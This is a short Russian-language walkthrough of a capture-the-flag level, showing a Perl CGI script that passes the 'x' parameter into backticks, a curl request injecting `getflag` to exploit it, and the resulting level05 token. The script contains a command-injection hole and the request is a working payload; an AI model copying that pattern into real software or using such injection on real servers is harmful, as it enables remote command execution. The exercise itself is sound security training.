1. В директории находится Perl-скрипт level04.pl с содержимым

#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

2. Строка с "localhost:4747" и описание CGI-скриптов в интернете намекает на то, что данный скрипт обслуживает запросы на данный порт
https://www.internet-technologies.ru/articles/cgi-na-perl-pervye-shagi.html
3. Для отправки запроса на активацию скрипта подойдет команда curl
https://zen.yandex.ru/media/mcs/10-komand-curl-kotorye-vam-sleduet-znat-5f8de17ab5e4d5370ed5e9d9
4. Запрос будет выглядеть так (скрипт принимает 1 параметр - x): curl localhost:4747/level04.pl?x="any text"
5. Скрипт выводит в терминал с помощью echo содержимое параметра x. Соответсвенно, это можно заэксплойтить.
6. Подадим в параметре x команду getflag c заэкранированными бэктиками:
curl -v localhost:4747/level04.pl?x=\`getflag\`
7. Токен для перехода на level05 получен: ne2searoevaevoem4ov4ar8ap
